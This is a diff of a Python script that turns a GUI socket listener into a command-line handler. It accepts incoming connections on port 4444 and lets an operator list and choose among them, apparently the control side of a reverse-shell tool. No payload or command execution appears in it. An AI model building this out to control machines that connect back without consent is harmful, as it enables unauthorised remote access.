@@ -1,13 +1,8 @@
 import socket, json
-import termcolor
 import base64
 import sys
 import threading
-
-from PyQt5.QtCore import *
-from PyQt5.QtGui import *
-from PyQt5.QtWidgets import *
-
+from termcolor import colored
 
 def UkDecode(text):
 	text = text.decode("cp866")
@@ -27,66 +22,58 @@ class Listener:
 		self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 		self.listener.bind((ip, port))
 
-		self.run = True
+		print("[+] Waiting for incoming connections")
+
 
 
 	def listen(self):
-		print("[+] Waiting for incoming connections")
-		while self.run:
+		try:
 			self.listener.listen(0)
 			connection, address = self.listener.accept()
-			print("[+] Got a connection from " + str(address))
+			print("\n[+] Got a connection from " + str(address))
+			print("# Press Enter")
 			self.connections.append((connection, address))
+			self.listen()
+		except: pass
 
 
 	def get_connections(self):
 		return self.connections
 
 
-	def stop_run(self):
-		self.run = False
-
-
-class ListenerWindow(QMainWindow):
-
-	def __init__(self, listener):
-		super().__init__()
-
-		self.listener = listener
-		self.init_ui()
-
-
-	def init_ui(self):
-		self.setWindowTitle("Listener")
-		self.setGeometry(200, 200, 500, 300)
-
-		self.btn = QPushButton(self)
-		self.btn.setText("Alright")
-		self.btn.move(100, 100)
-		self.btn.clicked.connect(self.alright)
-
-	
-	def alright(self):
-		for i in self.listener.get_connections():
-			print(i[1])
-
-
-	def closeEvent(self, event):
-		self.listener.stop_run()
-
+	def close(self):
+		self.listener.close()
 
 
 
 if __name__ == "__main__":
-	
-	my_listener = Listener("192.168.0.108", 4444)
-	listener_thread = threading.Thread(target=my_listener.listen)
-	listener_thread.start()
+	listener = Listener("192.168.0.199", 4444)
 
-	app = QApplication([])
-	application = ListenerWindow(my_listener)
-	application.show()
+	listen_thread = threading.Thread(target=listener.listen)
+	listen_thread.start()
 
-	sys.exit(app.exec())
-	my_listener.stop_run()
-	listener_thread.stop()
+	while True:
+		command = input(">>> ")
+		if command == "exit":
+			listener.close()
+			break
+
+		if command == "print":
+			for con in listener.get_connections():
+				print(con[1])
+
+		if command == "choose":
+			connections = listener.get_connections()
+			for con in range(len(connections)):
+				connection = connections[con][1]
+				print(f"{str(con+1)}. {connection}")
+
+		if command == "help":
+			help_message = colored("\n Type 'help' to see it\n\n", "yellow")
+			help_message += colored(" print", "green") + " - show all connections;\n"
+			help_message += colored(" choose", "green") + " - choose connection;\n"
+			help_message += colored(" exit", "red") + " - stop the program; \n"
+			print(help_message)
+
+
+
